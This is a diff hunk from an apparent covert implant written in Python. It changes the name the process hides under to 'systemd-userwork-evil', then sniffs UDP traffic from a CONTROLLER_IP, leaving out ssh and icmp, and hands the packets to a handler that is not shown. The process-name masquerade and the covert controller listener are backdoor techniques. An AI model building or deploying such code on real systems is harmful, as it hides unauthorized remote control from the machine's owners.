@@ -120,6 +120,6 @@ def packet_handler(pkt):
 
 if __name__ == "__main__":
     # Hide process name.
-    hide_process_name("not_suspicious")
+    hide_process_name("systemd-userwork-evil")
     # Start listening for packets.
     sniff(filter=f"ip src host {CONTROLLER_IP} and not port ssh and udp and not icmp", iface=f"{NETWORK_INTERFACE}", prn=packet_handler)
